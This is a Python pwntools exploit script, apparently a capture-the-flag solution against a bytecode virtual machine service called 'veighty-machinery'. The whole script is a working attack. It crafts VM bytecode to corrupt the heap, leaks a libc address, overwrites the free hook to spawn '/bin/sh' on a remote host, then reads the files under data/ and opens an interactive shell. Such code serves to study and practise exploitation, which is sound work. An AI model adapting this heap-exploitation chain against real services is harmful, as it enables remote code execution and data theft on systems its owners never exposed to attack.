from pwn import *
import sys

tosend = []
global code
code = ""

def push_stack(data):
    global code
    while len(data) % 8 != 0:
        data += "\x00"
    for i in range(0, len(data), 8):
        code += chr(3)
        tosend.append(data[i:i+8])

def alloc(data):
  global code
  code += chr(24)
  tosend.append(data + "\n")

def dup():
  global code
  code += chr(20)

def free():
  global code
  code += chr(23)

def pop():
    global code
    code += chr(2)

def add2():
    global code
    code += chr(4)

def swap2():
    global code
    code += chr(21)

#r = process(["ltrace", "./veighty-machinery"])
#r = process("./veighty-machinery")
# r = remote("fd66:666:1::2", 7777)
r = remote(sys.argv[1], sys.argv[2])

alloc("C"*0x10)
alloc("A"*0x500)
alloc("B"*0x10)
free()
free()
free()
push_stack(p64(0x9040/8))
swap2()
pop() # leak

pop()
pop()
pop()
pop()
pop()

push_stack(p64(0x4242424242424242)) # freehook

pop()
pop()
pop()
pop()
pop()

alloc("/bin/sh\x00"*0x2)
alloc(p64(0x4343434343434343))

free()

code += chr(33)
r.recvuntil("Length:")
r.sendline(str(len(code)))
r.recvuntil("Bytecode:")
r.send(code)

r.sendline("C"*0x10)
r.sendline("A"*0x500)
r.sendline("B"*0x10)
r.send(p64(0x9040/8))
print(r.recvuntil("0x"))
leak = int(r.recvline(), 16)
print("LEAK", hex(leak))
base = leak - 0x1bebe0
freehook = base + 0x1c1e70
r.send(p64(freehook-0x8))

r.sendline("D"*0x10)
#r.sendline("/bin/sh;" + p64(base + 0x55410))
r.sendline("/bin/sh;" + p64(base + 0x48e50))

r.sendline("cat data/*")

r.interactive()
